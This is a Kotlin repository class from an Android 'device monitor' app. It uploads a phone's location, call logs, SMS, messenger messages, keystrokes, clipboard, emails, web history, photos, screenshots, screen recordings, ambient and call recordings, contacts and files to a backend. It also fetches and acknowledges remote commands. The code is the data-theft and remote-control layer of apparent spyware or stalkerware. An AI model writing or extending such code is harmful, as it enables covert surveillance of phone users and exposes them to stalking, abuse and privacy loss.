package com.devicemonitor.data.repository

import com.devicemonitor.data.api.RetrofitClient
import com.devicemonitor.data.models.*

class DeviceRepository {

    private val api = RetrofitClient.api

    suspend fun insertDevice(device: Device) {
        api.insertDevice(device)
    }

    suspend fun getDeviceByToken(deviceToken: String): Device? {
        val response = api.getDevice("eq.$deviceToken")
        return if (response.isSuccessful && response.body()?.isNotEmpty() == true) {
            response.body()?.first()
        } else {
            null
        }
    }

    suspend fun updateDeviceStatus(deviceId: String, batteryLevel: Int, isCharging: Boolean, lastSeen: String) {
        val updates = mapOf(
            "battery_level" to batteryLevel.toString(),
            "is_charging" to isCharging.toString(),
            "last_seen" to lastSeen
        )
        api.updateDevice("eq.$deviceId", updates)
    }

    suspend fun insertLocation(location: LocationEntry) {
        api.insertLocation(location)
    }

    suspend fun insertCallLogs(callLogs: List<CallLogEntry>) {
        if (callLogs.isNotEmpty()) api.insertCallLogs(callLogs)
    }

    suspend fun insertSmsList(smsList: List<SmsEntry>) {
        if (smsList.isNotEmpty()) api.insertSmsList(smsList)
    }

    suspend fun insertMessengerMessage(message: MessengerMessage) {
        api.insertMessengerMessage(message)
    }

    suspend fun insertAppUsageList(usage: List<AppUsage>) {
        if (usage.isNotEmpty()) api.insertAppUsageList(usage)
    }

    suspend fun insertNetworkInfo(networkInfo: NetworkInfo) {
        api.insertNetworkInfo(networkInfo)
    }

    suspend fun insertDeviceInfo(deviceInfo: DeviceInfo) {
        api.insertDeviceInfo(deviceInfo)
    }

    suspend fun insertClipboardEntry(entry: ClipboardEntry) {
        api.insertClipboardEntry(entry)
    }

    suspend fun insertWebHistory(webHistory: WebHistory) {
        api.insertWebHistory(webHistory)
    }

    suspend fun insertKeystroke(keystroke: Keystroke) {
        api.insertKeystroke(keystroke)
    }

    suspend fun insertScreenshot(screenshot: Screenshot) {
        api.insertScreenshot(screenshot)
    }

    suspend fun insertPhoto(photo: Photo) {
        api.insertPhoto(photo)
    }

    suspend fun insertAmbientRecording(recording: AmbientRecording) {
        api.insertAmbientRecording(recording)
    }

    suspend fun insertScreenRecording(recording: ScreenRecording) {
        api.insertScreenRecording(recording)
    }

    suspend fun insertRiskAlert(alert: RiskAlert) {
        api.insertRiskAlert(alert)
    }

    suspend fun insertContactList(contacts: List<ContactEntry>) {
        if (contacts.isNotEmpty()) api.insertContacts(contacts)
    }

    suspend fun insertCallRecording(recording: CallRecording) {
        api.insertCallRecording(recording)
    }

    suspend fun insertEmailEntry(entry: EmailEntry) {
        api.insertEmailEntry(entry)
    }

    suspend fun insertCalendarEvent(event: CalendarEvent) {
        api.insertCalendarEvent(event)
    }

    suspend fun insertWifiHistory(history: WifiHistory) {
        api.insertWifiHistory(history)
    }

    suspend fun insertSocialMediaMedia(media: SocialMediaMedia) {
        api.insertSocialMediaMedia(media)
    }

    suspend fun insertInstalledApps(apps: List<InstalledApp>) {
        if (apps.isNotEmpty()) api.insertInstalledApps(apps)
    }

    suspend fun insertSensorData(data: SensorData) {
        api.insertSensorData(data)
    }

    suspend fun insertAppScreenContext(context: AppScreenContext) {
        api.insertAppScreenContext(context)
    }

    suspend fun insertSimChange(simChange: SimChange) {
        api.insertSimChange(simChange)
    }

    suspend fun insertFileEntries(files: List<FileEntry>) {
        if (files.isNotEmpty()) api.insertFileEntries(files)
    }

    suspend fun getBlockedApps(deviceId: String): List<BlockedApp> {
        val response = api.getBlockedApps("eq.$deviceId")
        return if (response.isSuccessful) response.body() ?: emptyList() else emptyList()
    }

    suspend fun insertAppTraffic(traffic: AppTraffic) {
        api.insertAppTraffic(traffic)
    }

    suspend fun getPendingCommands(deviceId: String): List<RemoteCommand> {
        val response = api.getPendingCommands("eq.$deviceId", "eq.pending")
        return if (response.isSuccessful) {
            response.body() ?: emptyList()
        } else {
            emptyList()
        }
    }

    suspend fun updateCommandStatus(id: String, status: String, result: String? = null, executedAt: String? = null) {
        val updates = mutableMapOf<String, String?>(
            "status" to status
        )
        result?.let { updates["result"] = it }
        executedAt?.let { updates["executed_at"] = it }
        
        api.updateCommandStatus("eq.$id", updates)
    }
}
